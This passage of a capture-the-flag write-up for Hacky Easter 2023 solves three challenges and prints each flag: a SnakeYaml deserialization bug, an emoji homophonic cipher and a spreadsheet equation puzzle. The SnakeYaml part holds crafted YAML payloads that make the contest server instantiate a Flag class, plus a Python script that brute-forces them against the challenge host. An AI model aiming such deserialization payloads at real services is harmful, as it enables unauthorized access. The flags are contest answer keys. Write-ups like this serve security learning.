        <span class="k">return</span> <span class="n">env</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"image.notfound"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">static</span> <span class="nc">String</span> <span class="nf">loadFlag</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">env</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"image.flag"</span><span class="o">);</span>
    <span class="o">}</span>

<span class="o">}</span>

</pre></table></code></div></div><p>So it looks like there is a secret code stored in <code class="language-plaintext highlighter-rouge">env.getProperty("secret.code")</code></p><h2 id="snakeyaml"><span class="mr-2">SnakeYaml</span><a href="#snakeyaml" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>So it’s definitely SnakeYaml which had a <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-1471">recent CVE</a>. Their wiki makes for some <a href="https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE-2022-1471">fun reading</a>, <a href="https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in">especially the issue that is linked</a> where Andrey asserts quite strongly that developers will only ever load trusted YAML.</p><p>Not sure if we need to do <a href="https://www.websec.ca/publication/Blog/CVE-2022-21404-Another-story-of-developers-fixing-vulnerabilities-unknowingly-because-of-CodeQL">this sort of setup with our own class hosted somewhere?</a>, that seems excessive since we don’t really need RCE, and we know which classes we can work with.</p><p>Here’s the script I have so far:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>t = f"""
!!com.hackyeaster.digitalsnakeart.Flag
image: snakes_at_the_beach
name: &amp;K snek
source: asdf
source: *K
resolution: 256x256
""".strip()


print(t)
query = base64.b64encode(t.encode('utf-8')).decode('utf-8')
print(query)
res = requests.get("http://ch.hackyeaster.com:2307/art?art=" + query).text.split('\n')

for x in res:
    if '&lt;h' in x:
        print(x)
    if '&lt;img' in x:
        digest = hashlib.md5(x.encode('utf-8')).hexdigest()
        if digest == "6bb27636aafe5e67fdc4ce31ff771942":
            print("404 error")
        else:
            print(digest)
</pre></table></code></div></div><p>but it seems to accept any value for the <code class="language-plaintext highlighter-rouge">!!com</code> bit so I guess I’m not doing that right. Looking at how python does it so I don’t have to read java:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">class</span> <span class="nc">A</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">a</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">a</span> <span class="o">=</span> <span class="n">a</span>

<span class="k">class</span> <span class="nc">Z</span><span class="p">(</span><span class="nb">int</span><span class="p">):</span>
    <span class="k">pass</span>

<span class="k">class</span> <span class="nc">B</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">a</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">a</span> <span class="o">=</span> <span class="n">a</span>

<span class="kn">import</span> <span class="n">yaml</span>
<span class="n">b</span> <span class="o">=</span> <span class="nc">B</span><span class="p">(</span><span class="nc">A</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="nc">Z</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span>
<span class="nf">print</span><span class="p">(</span><span class="n">yaml</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
</pre></table></code></div></div><p>produces the following yaml:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>!!python/object:__main__.B
a: !!python/object:__main__.A
  a: !!python/object/new:__main__.Z
  - 1
</pre></table></code></div></div><h2 id="exploiting"><span class="mr-2">Exploiting</span><a href="#exploiting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Ok so <code class="language-plaintext highlighter-rouge">com.hackyeaster.digitalsnakeart.Flag</code> is a super class of <code class="language-plaintext highlighter-rouge">Image</code>, so we just need to first annotate that it’s an image:</p><div class="language-yaml highlighter-rouge"><div class="code-header"> <span data-label-text="YAML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kt">!!com.hackyeaster.digitalsnakeart.SnakeArt</span>
<span class="na">image</span><span class="pi">:</span> <span class="kt">!!com.hackyeaster.digitalsnakeart.Flag</span>
<span class="pi">-</span> <span class="m">42</span>
<span class="na">name</span><span class="pi">:</span>
<span class="pi">-</span> <span class="nl">&amp;K</span> <span class="s">snek</span>
<span class="na">source</span><span class="pi">:</span> <span class="s">asdf</span>
<span class="na">source</span><span class="pi">:</span> <span class="nv">*K</span>
<span class="na">resolution</span><span class="pi">:</span> <span class="s">256x256</span>
</pre></table></code></div></div><p>Apparently, judging by the python above, you can just pass class arguments as a list (?!?!) and that’s equivalent to passing an argument by itself.</p><p>You can see I was testing other common yaml nonsense like references to see if that was the solution but no joy.</p><div class="language-yaml highlighter-rouge"><div class="code-header"> <span data-label-text="YAML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="na">name</span><span class="pi">:</span> <span class="s">snek</span>
<span class="na">name</span><span class="pi">:</span>
<span class="pi">-</span> <span class="s">snek</span>
</pre></table></code></div></div><p>For some reason these are equivalent? That’s kinda wild to me. SnakeYaml is truly bizarre.</p><p>Anyway, now we can just iterate over values rather than 42 (literally just did a for loop range(500)) and it gave us the flag!</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">base64</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="n">t</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">
    !!com.hackyeaster.digitalsnakeart.SnakeArt
    image: !!com.hackyeaster.digitalsnakeart.Flag
    - </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">
    name: snek
    source: asdf
    source: snek
    resolution: 256x256
    </span><span class="sh">"""</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>

    <span class="n">query</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">t</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://ch.hackyeaster.com:2307/art?art=</span><span class="sh">"</span> <span class="o">+</span> <span class="n">query</span><span class="p">).</span><span class="n">text</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
        <span class="c1">#if '&lt;h' in x:
</span>        <span class="c1">#    print(x)
</span>        <span class="k">if</span> <span class="sh">'</span><span class="s">&lt;img</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
            <span class="n">digest</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">md5</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)).</span><span class="nf">hexdigest</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">digest</span> <span class="o">==</span> <span class="sh">"</span><span class="s">6bb27636aafe5e67fdc4ce31ff771942</span><span class="sh">"</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">404 error</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">digest</span> <span class="o">==</span> <span class="sh">"</span><span class="s">5c2542cae881042b452596416a33eb66</span><span class="sh">"</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">TODO error</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">digest</span> <span class="o">==</span> <span class="sh">"</span><span class="s">0f6ef75665a4cbb3998311f0ef021d19</span><span class="sh">"</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">beach snakes</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">digest</span> <span class="o">==</span> <span class="sh">"</span><span class="s">10e42425510009d3c98ae54cec482039</span><span class="sh">"</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">false flag</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
                <span class="nf">print</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
                <span class="nf">print</span><span class="p">(</span><span class="n">digest</span><span class="p">)</span>
                <span class="k">break</span>
</pre></table></code></div></div><p><img src="writeupfiles/snek.png" alt="egg with qr code" /></p><h2> Flag</h2><code> he2023{0n3_d03s_n0t_s1mply_s0lv3_th1s_chllng!} </code><hr><h1 id="fruity-cipher"> Fruity Cipher <a href="/writeups/HackyEaster_2023/level7-5-fruity-cipher.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I found this fruity message. Can you decrypt it?</p><p>🥦🥝🍋🍊🥭🍌🫑🧅 🧅🥝🥖 🍉🍠🥬🫐 🍉🫐🥔🥥🍈 🥔🍌🥝🥖🍏 🥐🍍🥦🍉🍇🥥🍋 🥑🍉🍍🥐🍉 🍅🍠🥦 🍋🥭🍓🍐🌶🍇 🥕🌶🥔🥭🍓🍏🍒🍆🍏 🌶🫐🍎🍏🍒🥥🍊 🍎🥝 🍅🥝🥥🍇 🍎🍉🥔🍓 🥝🍓🍇 🥐🥭🥦🍉🍇🥥🍏🫐🍆🍎 🌶🫐🍎🍏🍇🥥🍋 🍎🍉🍇🍊🫐 🍠🥥🍒 🥐🍠🌶🫑🫐🍈 🍉🥝🍅🥝🥦🍉🥝🍓🍍🥐 🥐🍍🥕🍉🫐🥥🍋 🍏🍉🍇 🍋🥝🫑🥖🍏🍍🥝🍓 🥭🍋 🍉🧅🥦🍒🥥🥬🥭🍏🍠🍅🥭🍓🥝🍋🥭🍊</p><p>🚩 Flag</p><ul><li>lowercase only, no spaces<li>wrap into he2023{ and }<li>example: he2023{exampleflagonly}</ul><p><strong>Hints</strong></p><ul><li>the plaintext consist of lowercase letters (and spaces) only<li>there are more than 26 symbols<li>🍏 == 🍎</ul><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Ok, so we get a bunch of fruits, spaces seem to be in the right places. Substitution cipher? But we have more that 26 characters. Let’s convert it to ASCII characters to make it easier to work with.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">ct</span> <span class="o">=</span> <span class="sh">"</span><span class="s">🥦🥝🍋🍊🥭🍌🫑🧅 🧅🥝🥖 🍉🍠🥬🫐 🍉🫐🥔🥥🍈 🥔🍌🥝🥖🍏 🥐🍍🥦🍉🍇🥥🍋 🥑🍉🍍🥐🍉 🍅🍠🥦 🍋🥭🍓🍐🌶🍇 🥕🌶🥔🥭🍓🍏🍒🍆🍏 🌶🫐🍎🍏🍒🥥🍊 🍎🥝 🍅🥝🥥🍇 🍎🍉🥔🍓 🥝🍓🍇 🥐🥭🥦🍉🍇🥥🍏🫐🍆🍎 🌶🫐🍎🍏🍇🥥🍋 🍎🍉🍇🍊🫐 🍠🥥🍒 🥐🍠🌶🫑🫐🍈 🍉🥝🍅🥝🥦🍉🥝🍓🍍🥐 🥐🍍🥕🍉🫐🥥🍋 🍏🍉🍇 🍋🥝🫑🥖🍏🍍🥝🍓 🥭🍋 🍉🧅🥦🍒🥥🥬🥭🍏🍠🍅🥭🍓🥝🍋🥭🍊</span><span class="sh">"</span>

<span class="n">ct2</span> <span class="o">=</span> <span class="n">ct</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">,</span><span class="sh">""</span><span class="p">)</span>

<span class="n">fruits</span> <span class="o">=</span> <span class="nf">set</span><span class="p">(</span><span class="n">ct2</span><span class="p">)</span>
<span class="n">fruitstr</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join </span><span class="p">(</span><span class="n">fruits</span><span class="p">)</span>
<span class="n">alphanum</span> <span class="o">=</span> <span class="sh">"</span><span class="s">abcdefghijklmnopqrstuvwxyz123</span><span class="sh">"</span>

<span class="n">t</span> <span class="o">=</span> <span class="n">ct</span><span class="p">.</span><span class="nf">maketrans</span><span class="p">(</span><span class="n">fruitstr</span><span class="p">,</span><span class="n">alphanum</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">ct</span><span class="p">.</span><span class="nf">translate</span><span class="p">(</span><span class="n">t</span><span class="p">))</span>
</pre></table></code></div></div><p>this gives us a ciphertext of</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wqsaonmx xqv zphj zjb3f bnqvu tewz13s rzetz cpw soydi1 kiboyul2u ijgul3a gq cq31 gzby qy1 towz13uj2g ijgu13s gz1aj p3l tpimjf zqcqwzqyet tekzj3s uz1 sqmvueqy os zxwl3houpcoyqsoa
</pre></table></code></div></div><p>Now we enter this in <a href="https://www.dcode.fr/monoalphabetic-substitution">dcode.fr substitution solver</a>. And the automatic analyzer gets us sortof close, we recognize a possible subsentence “more than one”, and then we fiddle a bit more with the mapping between plaintext and ciphertext, quickly realizing that different ciphertext letters map to the same plaintext letter, so we are dealing with a homophonic cipher.</p><p><img src="writeupfiles/fruity-ss.png" alt="" /></p><p>The text we get is</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>POSSIBLY YOU HAVE HEA3D ABOUT CIPH13S
WHICH MAP SINGL1 PLAINTE2T LETTE3S TO
MO31 THAN ON1 CIPH13TE2T LETT13S TH1SE
A3E CALLED HOMOPHONIC CIPHE3S TH1
SOLUTION IS HYPE3VITAMINOSIS
</pre></table></code></div></div><p>from this we can see that the missing mappings are <code class="language-plaintext highlighter-rouge">1=E, 2=X, 3=R</code>, and so the full message reads:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>POSSIBLY YOU HAVE HEARD ABOUT CIPHERS
WHICH MAP SINGLE PLAINTEXT LETTERS TO
MORE THAN ONE CIPHERTEXT LETTERS THESE
A3E CALLED HOMOPHONIC CIPHERS THE
SOLUTION IS HYPERVITAMINOSIS
</pre></table></code></div></div><p>and we find our flag!</p><h2> Flag</h2><code> he2023{hypervitaminosis} </code><hr><h1 id="kaos-motorn"> Kaos Motorn <a href="/writeups/HackyEaster_2023/level7-6-kaos-motorn.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What? Is? This? <a href="https://docs.google.com/spreadsheets/d/1yxWyraRKss6Wqbw_ejuws6v92vwdE1AEAP1Cc8oec7M/edit?usp=sharing">Kaos?</a></p><p><strong>Hint:</strong> Inputs are in the range 0..9.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We get a link to a mysterious Google spreadsheet:</p><p><img src="writeupfiles/kaos-screenshot.png" alt="" /></p><p>We make our <a href="https://docs.google.com/spreadsheets/d/1rhnP4bK9lTDUk5FKnVthlbLbxPjLboOfSJk-rjI-nmo/edit?usp=sharing">own copy</a> that we can fool around with</p><p>Basically, there are a set of equations, converting a set of input numbers (along the outside ring), and leading to a flag (in the middle). Assumuing it starts with <code class="language-plaintext highlighter-rouge">he2023</code>, we get the following equations for the first output character</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>h = 52 + B5                        = 104 // should be 104 for 'h'
B5 = J13+D11+F12+I10   % 64        = 52
J13 = D14+B7*E2        % 64
D11 = E2*G14           % 64
F12 = E2*B7+D14        % 64
I10 = J6*G14+B7        % 64

D14 = 7
B7 = 9
E2 = 5
G14 = 8
J6 = 2
</pre></table></code></div></div><p>Presumable we can alter the values in cells D14,B7,E2,G14,J6 to get our flag?</p><p>We will need to do this for more of the known characters then</p><p>ok, lets do the same for <code class="language-plaintext highlighter-rouge">e</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>e = 44 + I7  # must be 101
I7 = F12+D11*G6+H3     # must be 57
F12 = E2 * B7+ D14   % 64
D11 = E2 * G14       % 64
G6 = G14*B7+D14      % 64
H3 = B7*J6*7         % 64
</pre></table></code></div></div><p>Since we know the inputs are in range of of 0-9, we write a small script to see how many possibilities this leaves us with</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="n">options</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">d14</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
  <span class="k">for</span> <span class="n">b7</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">e2</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
      <span class="k">for</span> <span class="n">g14</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j6</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>

          <span class="c1"># equations for h
</span>          <span class="n">i10</span> <span class="o">=</span> <span class="p">(</span><span class="n">j6</span><span class="o">*</span><span class="n">g14</span><span class="o">+</span><span class="n">b7</span><span class="p">)</span>      <span class="o">%</span> <span class="mi">64</span>
          <span class="n">f12</span> <span class="o">=</span> <span class="p">(</span><span class="n">e2</span><span class="o">*</span><span class="n">b7</span><span class="o">+</span><span class="n">d14</span><span class="p">)</span>      <span class="o">%</span> <span class="mi">64</span>
          <span class="n">d11</span> <span class="o">=</span> <span class="p">(</span><span class="n">e2</span><span class="o">*</span><span class="n">g14</span><span class="p">)</span>         <span class="o">%</span> <span class="mi">64</span>
          <span class="n">j13</span> <span class="o">=</span> <span class="p">(</span><span class="n">d14</span> <span class="o">+</span><span class="n">b7</span><span class="o">*</span><span class="n">e2</span><span class="p">)</span>     <span class="o">%</span> <span class="mi">64</span>
          <span class="n">b5</span> <span class="o">=</span> <span class="p">(</span><span class="n">j13</span><span class="o">+</span><span class="n">d11</span><span class="o">+</span><span class="n">f12</span><span class="o">+</span><span class="n">i10</span><span class="p">)</span> <span class="o">%</span> <span class="mi">64</span>

          <span class="c1"># equations for e
</span>          <span class="n">h3</span> <span class="o">=</span> <span class="p">(</span><span class="n">b7</span><span class="o">*</span><span class="n">j6</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>        <span class="o">%</span> <span class="mi">64</span>
          <span class="n">g6</span> <span class="o">=</span> <span class="p">(</span><span class="n">g14</span><span class="o">*</span><span class="n">b7</span><span class="o">+</span><span class="n">d14</span><span class="p">)</span>     <span class="o">%</span> <span class="mi">64</span>
          <span class="n">i7</span> <span class="o">=</span> <span class="p">(</span><span class="n">f12</span><span class="o">+</span><span class="n">d11</span><span class="o">*</span><span class="n">g6</span><span class="o">+</span><span class="n">h3</span><span class="p">)</span>  <span class="o">%</span> <span class="mi">64</span>

          <span class="k">if</span> <span class="n">b5</span> <span class="o">==</span> <span class="mi">52</span> <span class="ow">and</span> <span class="n">i7</span> <span class="o">==</span> <span class="mi">57</span><span class="p">:</span>
            <span class="n">options</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">d14: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">d14</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s"> b7: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">b7</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s"> e2: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">e2</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s"> g14: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">g14</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="s"> j6: </span><span class="sh">"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">j6</span><span class="p">))</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Options: </span><span class="sh">"</span><span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">options</span><span class="p">))</span>
</pre></table></code></div></div><p>This still leaves us with 18 differnt options for the 5 inputs, so we add another restriction for the next character of the string we know (<code class="language-plaintext highlighter-rouge">2</code>)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>'2' = 48+J3  # should be 50
J3 =  F12+D11+D5+F4    % 64        # should be 2
F12 = see above
D11 = see above
D5 = E2+J6+B7+D14+G14
F4 = E2*G14+D14+J6
</pre></table></code></div></div><p>so we add this to our script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="n">options</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">d14</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
  <span class="k">for</span> <span class="n">b7</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">e2</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
      <span class="k">for</span> <span class="n">g14</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j6</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">):</span>

          <span class="c1"># equations for h
</span>          <span class="n">i10</span> <span class="o">=</span> <span class="p">(</span><span class="n">j6</span><span class="o">*</span><span class="n">g14</span><span class="o">+</span><span class="n">b7</span><span class="p">)</span>      <span class="o">%</span> <span class="mi">64</span>
          <span class="n">f12</span> <span class="o">=</span> <span class="p">(</span><span class="n">e2</span><span class="o">*</span><span class="n">b7</span><span class="o">+</span><span class="n">d14</span><span class="p">)</span>      <span class="o">%</span> <span class="mi">64</span>
          <span class="n">d11</span> <span class="o">=</span> <span class="p">(</span><span class="n">e2</span><span class="o">*</span><span class="n">g14</span><span class="p">)</span>         <span class="o">%</span> <span class="mi">64</span>
          <span class="n">j13</span> <span class="o">=</span> <span class="p">(</span><span class="n">d14</span> <span class="o">+</span><span class="n">b7</span><span class="o">*</span><span class="n">e2</span><span class="p">)</span>     <span class="o">%</span> <span class="mi">64</span>
          <span class="n">b5</span> <span class="o">=</span> <span class="p">(</span><span class="n">j13</span><span class="o">+</span><span class="n">d11</span><span class="o">+</span><span class="n">f12</span><span class="o">+</span><span class="n">i10</span><span class="p">)</span> <span class="o">%</span> <span class="mi">64</span>

          <span class="c1"># equations for e
</span>          <span class="n">h3</span> <span class="o">=</span> <span class="p">(</span><span class="n">b7</span><span class="o">*</span><span class="n">j6</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>        <span class="o">%</span> <span class="mi">64</span>
          <span class="n">g6</span> <span class="o">=</span> <span class="p">(</span><span class="n">g14</span><span class="o">*</span><span class="n">b7</span><span class="o">+</span><span class="n">d14</span><span class="p">)</span>     <span class="o">%</span> <span class="mi">64</span>
          <span class="n">i7</span> <span class="o">=</span> <span class="p">(</span><span class="n">f12</span><span class="o">+</span><span class="n">d11</span><span class="o">*</span><span class="n">g6</span><span class="o">+</span><span class="n">h3</span><span class="p">)</span>  <span class="o">%</span> <span class="mi">64</span>

          <span class="c1"># equations for '2'
